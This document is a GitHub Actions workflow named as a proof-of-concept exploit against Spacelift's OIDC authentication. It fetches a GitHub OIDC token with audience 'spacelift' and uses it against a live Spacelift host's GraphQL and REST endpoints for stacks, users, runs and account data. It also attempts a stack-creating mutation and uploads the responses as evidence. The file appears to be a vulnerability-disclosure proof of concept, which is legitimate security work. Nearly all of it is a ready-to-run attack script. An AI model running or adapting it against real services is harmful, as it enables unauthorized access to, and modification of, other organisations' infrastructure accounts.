name: Spacelift OIDC Exploit POC
on: 
  workflow_dispatch:  # Manual trigger only
  push:
    branches: [ main ]

permissions:
  id-token: write  # REQUIRED for OIDC token
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: ğŸ” Get GitHub OIDC Token
        id: get_token
        run: |
          echo "Requesting OIDC token with audience: spacelift"
          
          # Request OIDC token from GitHub
          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=spacelift" | jq -r .value)
          
          # Mask token in logs
          echo "::add-mask::$TOKEN"
          echo "token=$TOKEN" >> $GITHUB_OUTPUT
          
          echo "âœ… Token obtained successfully"
          
          # Display token payload (without signature)
          echo "ğŸ“„ Token payload:"
          echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | jq . || echo "Could not decode"
      
      - name: ğŸ¯ Test Spacelift GraphQL API
        env:
          OIDC_TOKEN: ${{ steps.get_token.outputs.token }}
        run: |
          echo "Testing GraphQL endpoint..."
          
          curl -X POST https://spacelift-io.app.spacelift.dev/api/graphql \
            -H "Authorization: Bearer $OIDC_TOKEN" \
            -H "Content-Type: application/json" \
            -d '{"query":"{ viewer { login id admin } }"}' \
            -v -o graphql_response.json
          
          echo -e "\nğŸ“Š GraphQL Response:"
          cat graphql_response.json | jq . || cat graphql_response.json
      
      - name: ğŸ“¦ Test Stacks API
        env:
          OIDC_TOKEN: ${{ steps.get_token.outputs.token }}
        run: |
          echo "Testing Stacks endpoint..."
          
          curl https://spacelift-io.app.spacelift.dev/api/v1/stacks \
            -H "Authorization: Bearer $OIDC_TOKEN" \
            -v -o stacks_response.json
          
          echo -e "\nğŸ“Š Stacks Response:"
          cat stacks_response.json | jq . || cat stacks_response.json
      
      - name: ğŸ‘¤ Test User API
        env:
          OIDC_TOKEN: ${{ steps.get_token.outputs.token }}
        run: |
          echo "Testing User endpoint..."
          
          curl https://spacelift-io.app.spacelift.dev/api/v1/users \
            -H "Authorization: Bearer $OIDC_TOKEN" \
            -v -o users_response.json
          
          echo -e "\nğŸ“Š Users Response:"
          cat users_response.json | jq . || cat users_response.json
      
      - name: ğŸƒ Test Runs API
        env:
          OIDC_TOKEN: ${{ steps.get_token.outputs.token }}
        run: |
          echo "Testing Runs endpoint..."
          
          curl https://spacelift-io.app.spacelift.dev/api/v1/runs \
            -H "Authorization: Bearer $OIDC_TOKEN" \
            -v -o runs_response.json
          
          echo -e "\nğŸ“Š Runs Response:"
          cat runs_response.json | jq . || cat runs_response.json
      
      - name: ğŸ”“ Test Account Access
        env:
          OIDC_TOKEN: ${{ steps.get_token.outputs.token }}
        run: |
          echo "Testing Account endpoint..."
          
          curl https://spacelift-io.app.spacelift.dev/api/v1/account \
            -H "Authorization: Bearer $OIDC_TOKEN" \
            -v -o account_response.json
          
          echo -e "\nğŸ“Š Account Response:"
          cat account_response.json | jq . || cat account_response.json
      
      - name: ğŸ’¥ Test Write Access (Mutation)
        env:
          OIDC_TOKEN: ${{ steps.get_token.outputs.token }}
        run: |
          echo "âš ï¸  Testing write access with mutation..."
          echo "This will attempt to create a test resource"
          
          # Test creating a stack (will fail if no write access)
          curl -X POST https://spacelift-io.app.spacelift.dev/api/graphql \
            -H "Authorization: Bearer $OIDC_TOKEN" \
            -H "Content-Type: application/json" \
            -d '{"query":"mutation { stackCreate(input:{name:\"POC-Test-Delete-Me\", repository:\"test\", branch:\"main\"}) { id name } }"}' \
            -v -o mutation_response.json
          
          echo -e "\nğŸ“Š Mutation Response:"
          cat mutation_response.json | jq . || cat mutation_response.json
      
      - name: ğŸ“‹ Summary
        if: always()
        run: |
          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo "ğŸ¯ SPACELIFT OIDC EXPLOIT POC - SUMMARY"
          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo ""
          echo "Repository: ${{ github.repository }}"
          echo "Actor: ${{ github.actor }}"
          echo "Workflow: ${{ github.workflow }}"
          echo "Run ID: ${{ github.run_id }}"
          echo ""
          echo "Check the responses above to verify if authentication succeeded."
          echo ""
          echo "ğŸ” What to look for:"
          echo "  âœ… Success: JSON responses with actual data"
          echo "  âŒ Failed: HTML login pages or 401/403 errors"
          echo ""
          echo "If successful, this proves the OIDC vulnerability!"
          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
      
      - name: ğŸ“¤ Upload Evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: spacelift-exploit-evidence
          path: |
            graphql_response.json
            stacks_response.json
            users_response.json
            runs_response.json
            account_response.json
            mutation_response.json
          retention-days: 7
